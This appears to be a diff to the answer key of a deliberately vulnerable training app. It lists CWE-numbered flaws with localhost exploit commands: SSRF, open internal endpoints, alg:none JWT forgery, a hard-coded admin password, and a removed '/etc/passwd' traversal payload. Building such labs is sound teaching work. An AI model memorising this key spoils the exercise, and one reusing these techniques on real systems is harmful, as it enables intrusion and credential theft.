@@ -48,36 +48,15 @@ Your own guest token works on any post — no ownership check — so you do not 
 **Answer:** request fields are copied onto the entity.
 **How:** `POST /api/posts` with `{"content":"hi","authorId":999,"isTrending":true}`.
 
-### #05 — CSRF (CWE-352)
-**Answer:** cookie auth accepted as proof of identity; CORS echoes any origin with credentials.
-**How:** cross-origin `fetch(..., { credentials: 'include' })` to `/api/posts`.
-
 ### #06 — SSRF (CWE-918)
 **Answer:** server fetches any URL given.
 **How:** `curl -X POST http://localhost:8080/api/link-preview -H 'Content-Type: application/json' -d '{"url":"http://social-service:8080/health"}'`
 **Flag source:** the SSRF objective's flag lives at `http://game-service:8080/internal/vault/<objId>` (reachable only server-side).
 
-### #07 — Path Traversal / LFI (CWE-22)
-**Answer:** attachment path is not contained.
-**How:** `curl -G --data-urlencode 'name=../../../../etc/passwd' http://localhost:8080/api/posts/attachment`
-
 ### #08 — Missing Authentication (CWE-306)
 **Answer:** internal endpoints left open; gateway routes `/internal/*` publicly.
 **How:** `curl -X POST http://localhost:8080/internal/posts -H 'Content-Type: application/json' -d '{"authorName":"intruder","content":"pwned","isTrending":false}'`
 (Note the path is `/internal/posts`, **not** `/api/internal/posts` — the gateway routes `/internal/*` directly to the social service.)
-
-### #09 — Timing Side Channel (CWE-208)
-**Answer:** plain `==` on secrets → timing oracle over the flag comparison.
-**How:** measure `/api/objectives/<id>/submit` timings while guessing prefixes.
-
-### #10 — User Enumeration (CWE-204)
-**Answer:** login distinguishes unknown users (404) from wrong passwords (401).
-
-### #11 — Missing Rate Limiting (CWE-307)
-**Answer:** no throttling on login/flag submission; rapid guesses get `401` not `429`.
-
-### #12 — Weak Password Hashing (CWE-916)
-**Answer:** unsalted SHA-256; same password → same hash.
 
 ### #13 — Improper JWT Verification (CWE-347)
 **Answer:** signature/issuer/audience/lifetime validation disabled → forge `alg:none` token with `role=Admin`.
@@ -87,9 +66,6 @@ curl -X GET "http://localhost:8080/api/objectives/<objectiveId>/flag" -H "Author
 ```
 **Flag:** via admin flag endpoint with forged token, or real admin (#16).
 
-### #14 — Race Condition / TOCTOU (CWE-362)
-**Answer:** check-then-write without conditional update; parallel correct submissions both win.
-
 ### #15 — Sensitive Data Exposure (CWE-200)
 **Answer:** anonymous `GET /api/objectives` returns every flag.
 **How:** `curl http://localhost:8080/api/objectives | jq '.[0].flag'`
@@ -97,22 +73,6 @@ curl -X GET "http://localhost:8080/api/objectives/<objectiveId>/flag" -H "Author
 ### #16 — Hard-coded Credentials (CWE-798)
 **Answer:** admin password and JWT secret committed in repo.
 **How:** `POST /api/auth/login {"username":"admin","password":"admin1234"}` → admin token → flag endpoint.
-
-### #17 — Spoofable Client IP (CWE-348)
-**Answer:** app trusts all networks via `X-Forwarded-For`.
-**How:** send fake `X-Forwarded-For: <ip>` to rotate rate-limit buckets.
-
-### #18 — Error Message Information Leak (CWE-209)
-**Answer:** developer exception page leaks internals; malformed input → stack trace.
-**How:** `curl -G --data-urlencode 'query=' http://localhost:8080/api/posts/search` → 500 + `PostgresException`.
-
-### #19 — Token in Browser Storage (CWE-922)
-**Answer:** JWT in `localStorage`; any stored XSS can steal it.
-**How:** `localStorage.getItem('trollnet.token')` in DevTools after XSS, or via XSS payload exfiltration.
-
-### #20 — Clickjacking (CWE-1021)
-**Answer:** missing `X-Frame-Options`; CSP `frame-ancestors *`.
-**How:** embed `http://localhost:8080` in an iframe on another page.
 
 ---
 
